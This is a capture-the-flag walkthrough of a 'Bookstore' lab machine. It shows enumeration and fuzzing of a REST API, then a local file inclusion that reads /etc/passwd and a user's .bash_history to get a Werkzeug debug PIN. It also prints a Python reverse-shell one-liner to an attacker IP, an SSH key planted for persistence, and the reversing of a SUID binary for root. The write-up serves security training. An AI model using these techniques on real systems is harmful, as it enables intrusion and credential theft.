# Bookstore
Enumerating the machine with nmap we get:
```
➜  ~ nmap -sV -p- 10.10.25.162 
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:12 CET
Nmap scan report for 10.10.25.162
Host is up (0.043s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.70 seconds
```
We know from the tags that the room is about API fuzzing, 
so going to the httpd service running on port 5000 might get us some insights:
```
~ curl http://10.10.25.162:5000/

    <title>Home</title>
    <h1>Foxy REST API v2.0</h1>
    <p>This is a REST API for science fiction novels.</p>
```
Enumerating the service with gobuster shows us.
```
➜  ~ gobuster dir --url http://10.10.25.162:5000 --wordlist=/home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt -t 100                                                                              
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.25.162:5000
[+] Method:         GET
[+] Threads:        100
[+] Wordlist:       /home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Timeout:        10s
===============================================================
2020/12/09 16:21:05 Starting gobuster in directory enumeration mode
===============================================================
/api (Status: 200)            
/console (Status: 200)
===============================================================
2020/12/09 16:41:58 Finished
===============================================================
```

Trying to access `/console` asks us for a pin. 
It says that "You can find the PIN printed out on the standard output of your shell that runs the server.".
However researching Werkzug console shows that an explicit PIN can set with the environmental variable `WERKZEUG_DEBUG_PIN`.
If this is the case we should be able to find it in `.bash_history`.
Trying to access `/api` shows us the api specification, how convinient.
We notice that the endpoints use semantic versioning, i.e. `/api/v2/...`. 
Since there's a `v2` there might be a `v1`.
We'll save that for later.

Enumerating the service running on port 80, shows us:
```
➜  ~ gobuster dir --url http://10.10.25.162/ --wordlist=/home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt -t 100         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.25.162/
[+] Method:         GET
[+] Threads:        100
[+] Wordlist:       /home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Timeout:        10s
===============================================================
2020/12/09 17:04:10 Starting gobuster in directory enumeration mode
===============================================================
/images (Status: 301)
/assets (Status: 301)
/javascript (Status: 301)     
/server-status (Status: 403)     
                                   
===============================================================
2020/12/09 17:07:50 Finished
===============================================================
```
The `assets` folder seems interesting:
Checking it out we find that it contains another directory called `js`. 
Here we find a script called `api.js`, it contains the following:
```
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }


async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```
The last comment is awesome! Now we know what to look for.
Trying to call the old api (`/api/v1`) works:
```
➜  ~ curl http://10.10.25.162:5000/api/v1/resources/books\?id\=1 
[
  {
    "author": "Ann Leckie ", 
    "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.", 
    "id": "1", 
    "published": 2014, 
    "title": "Ancillary Justice"
  }
]
```
So it's still online and containing a LFI vulnerbility. 
Now we have a chance of printing `.bash_history` and gain access to the `/console` endpoint.
We still don't know which parameter is vulnerable though. 
It might have been deleted form the `v2` docs we have available.
Trying to fuzz for the parameter gives us:
```
➜  vulns git:(master) ✗ wfuzz -c -z file,/home/emil/KaliLists/wfuzz/general/big.txt --hc 404 "http://10.10.25.162:5000/api/v1/resources/books?FUZZ=FUZZ"                                           
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.25.162:5000/api/v1/resources/books?FUZZ=FUZZ
Total requests: 3036

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000001352:   200        1 L      1 W        3 Ch        "id - id"                             
000002489:   500        356 L    1747 W     23076 Ch    "show - show"                         

Total time: 45.88847
Processed Requests: 3036
Filtered Requests: 3034
Requests/sec.: 66.16040
```
How lucky a parameter called `show`, wonder what that does.
Trying to access the endpoint `http://10.10.25.162:5000/api/v1/resources/books?show=a` yields the error `filename not defined`.
Trying to access `/etc/passwd` get us:
```
➜  ~ curl http://10.10.25.162:5000/api/v1/resources/books\?show\=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```
Now we know the user is called `sid` and we can try to acces the `.bash_history` file.
```
➜  ~ curl http://10.10.25.162:5000/api/v1/resources/books\?show\=/home/sid/.bash_history
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=<REDACTED>
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
``` 
Going to the `/console` endpoint we can supply this PIN.
We now have a python debug console! Awesome!
Setting up a netcat listner on port 1234:
```
nc -lnvp 1234
```
and running:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.129.26",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
grants us a shell!
We're now able to read the user.txt
```
$ ls -la
total 80
drwxr-xr-x 5 sid  sid   4096 Oct 20 03:16 .
drwxr-xr-x 3 root root  4096 Oct 20 02:21 ..
-r--r--r-- 1 sid  sid   4635 Oct 20 02:52 api.py
-r-xr-xr-x 1 sid  sid    160 Oct 14 21:49 api-up.sh
-r--r----- 1 sid  sid    116 Dec  9 22:08 .bash_history
-rw-r--r-- 1 sid  sid    220 Oct 20 02:21 .bash_logout
-rw-r--r-- 1 sid  sid   3771 Oct 20 02:21 .bashrc
-rw-rw-r-- 1 sid  sid  16384 Oct 19 22:03 books.db
drwx------ 2 sid  sid   4096 Oct 20 02:53 .cache
drwx------ 3 sid  sid   4096 Oct 20 02:53 .gnupg
drwxrwxr-x 3 sid  sid   4096 Oct 20 02:29 .local
-rw-r--r-- 1 sid  sid    807 Oct 20 02:21 .profile
-rwsrwsr-x 1 root sid   8488 Oct 20 03:01 try-harder
-r--r----- 1 sid  sid     33 Oct 15 11:14 user.txt
$ cat user.txt
<REDACTED>
```
We notice a file owned by root with the SUID set, how convinient.
We can now generate a `.ssh` folder and add our own public key to the `authorized_keys` file:
```
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/sid/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Created directory '/home/sid/.ssh'.
Your identification has been saved in /home/sid/.ssh/id_rsa.
Your public key has been saved in /home/sid/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:PvVVh51D9H/BTCl456l7utwSihpHcYxJw+uQyNY+8jE sid@bookstore
The key's randomart image is:
+---[RSA 2048]----+
|        .o  . .+.|
|        ..=. o==o|
|    . o .+.o. =**|
|     + + .o    +=|
|    . . S..   o o|
|     . E.o . +  .|
|      o.*.. o o  |
|       .oo ..o.. |
|       ..    +=. |
+----[SHA256]-----+
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQhlkPFGyv/Vujc0Kk2iWmOg8RbEDDjfF4ZSnsPVitkZQYtRYlDdvcvHjV/QBvpmmbzsqAx8Ba5rJn1Lstk2k3Rmlpj8s2DEdBGp4KNzRxIpD7UGmZDBy2X+iKQCg/4OXe6NOkBPmmWp7bOxXEGWJIwPjMc5ZwdgUCGhLU8BLXihNZcqtJwXAGwptXSz4wq5Fzz/NH+jHgFcb/9cYClssLbin+BaDA6y5IplD9nAaj1m6YaoJJvrOM2kT+mBliSvuRGl4UjlFMk31lRcWYOON0x+Hx6XIrvYxKYDp+0LqD5gfT7fTQxBH42mRYIkE0mBtY18YExj9VdD6lsHORUPWOAZlaQr4FsjUn2ZqaGyTRFM+7pM1CfuE3EDHZ4N0vGG4MoSPcZFrSkcQ1Y5/30jQkdxHNCpX5UzyAf8IjhUCkeVfopFtMo58Rn0Hg8F/aaMjRISihJ4SMwOA2pZ5hCXh2hHiPvItPfkTErB4pRgDa6uLN0PxI4cr5hAB21+3xViE= emil@emil-244743g" >> .ssh/authorized_keys
```
We can now login with ssh
```
➜  /tmp ssh sid@10.10.25.162                                               
The authenticity of host '10.10.25.162 (10.10.25.162)' can't be established.
ECDSA key fingerprint is SHA256:VMHtdCF8Q2YyC5DyxF1h7vpUfdhe/jGEguQyqn/6mRk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.25.162' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec  9 22:32:00 IST 2020

  System load:  0.0               Processes:           94
  Usage of /:   34.3% of 7.81GB   Users logged in:     0
  Memory usage: 24%               IP address for eth0: 10.10.25.162
  Swap usage:   0%


71 packages can be updated.
51 updates are security updates.


Last login: Tue Oct 20 03:16:41 2020 from 192.168.1.6
sid@bookstore:~$ 
```
We setup a http server and download the file:
```
sid@bookstore:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```
➜  /tmp wget http://10.10.25.162:8000/try-harder
--2020-12-09 18:06:39--  http://10.10.25.162:8000/try-harder
Connecting to 10.10.25.162:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8488 (8,3K) [application/octet-stream]
Saving to: ‘try-harder’

try-harder        100%[============>]   8,29K  --.-KB/s    in 0s      

2020-12-09 18:06:39 (87,4 MB/s) - ‘try-harder’ saved [8488/8488]
```
Decompiling its' main function we get:
```
➜  /tmp gdb -batch -ex 'file try-harder' -ex 'set disassembly-flavor att' -ex 'disassemble main'
Dump of assembler code for function main:
   0x00000000000007aa <+0>:	push   %rbp
   0x00000000000007ab <+1>:	mov    %rsp,%rbp
   0x00000000000007ae <+4>:	sub    $0x20,%rsp
   0x00000000000007b2 <+8>:	mov    %fs:0x28,%rax
   0x00000000000007bb <+17>:	mov    %rax,-0x8(%rbp)
   0x00000000000007bf <+21>:	xor    %eax,%eax
   0x00000000000007c1 <+23>:	mov    $0x0,%edi
   0x00000000000007c6 <+28>:	call   0x680 <setuid@plt>
   0x00000000000007cb <+33>:	movl   $0x5db3,-0x10(%rbp) ### Load 0x5db3 onto stack
   0x00000000000007d2 <+40>:	lea    0xfb(%rip),%rdi     ### Load string "What's The Magic Number?!"
   0x00000000000007d9 <+47>:	call   0x640 <puts@plt>	   ### Print string to screen with puts
   0x00000000000007de <+52>:	lea    -0x14(%rbp),%rax
   0x00000000000007e2 <+56>:	mov    %rax,%rsi
   0x00000000000007e5 <+59>:	lea    0x102(%rip),%rdi        # 0x8ee
   0x00000000000007ec <+66>:	mov    $0x0,%eax
   0x00000000000007f1 <+71>:	call   0x670 <__isoc99_scanf@plt> ### Scan in our input i.e. our magic number
   0x00000000000007f6 <+76>:	mov    -0x14(%rbp),%eax		  ### Load our magic number into eax
   0x00000000000007f9 <+79>:	xor    $0x1116,%eax		  ### Magic number ^ 0x1116
   0x00000000000007fe <+84>:	mov    %eax,-0xc(%rbp)            ### Move XOR'ed magic number onto stack
   0x0000000000000801 <+87>:	mov    -0x10(%rbp),%eax		  ### Load 0x5db3 back into register
   0x0000000000000804 <+90>:	xor    %eax,-0xc(%rbp)		  ### 0x5db3 ^ modified magic number
   0x0000000000000807 <+93>:	cmpl   $0x5dcd21f4,-0xc(%rbp)     ### Compare XOR'ed magic number to 0x5dcd21f4
   0x000000000000080e <+100>:	jne    0x823 <main+121>
   0x0000000000000810 <+102>:	lea    0xda(%rip),%rdi        # 0x8f1
   0x0000000000000817 <+109>:	mov    $0x0,%eax
   0x000000000000081c <+114>:	call   0x660 <system@plt>
   0x0000000000000821 <+119>:	jmp    0x82f <main+133>
   0x0000000000000823 <+121>:	lea    0xd4(%rip),%rdi        # 0x8fe
   0x000000000000082a <+128>:	call   0x640 <puts@plt>
   0x000000000000082f <+133>:	nop
   0x0000000000000830 <+134>:	mov    -0x8(%rbp),%rax
   0x0000000000000834 <+138>:	xor    %fs:0x28,%rax
   0x000000000000083d <+147>:	je     0x844 <main+154>
   0x000000000000083f <+149>:	call   0x650 <__stack_chk_fail@plt>
   0x0000000000000844 <+154>:	leave  
   0x0000000000000845 <+155>:	ret    
End of assembler dump.
```
With the analysis in the comments we see that our magic number should solve the equation:
```
0x5dcd21f4 = 0x1116 ^ 0x5db3 ^ x
```
So we have:
```
x = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3 = 0x5dcd6d51 = 0d<REDACTED>
```
So that's our magic number!
Running the `try-harder` ELF on the server and supplying the magic number grants us a root shell!
```
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
<REDACTED>
root@bookstore:~#
```
We can now read the root flag:
```
root@bookstore:/root# cat /root/root.txt
<REDACTED>
```
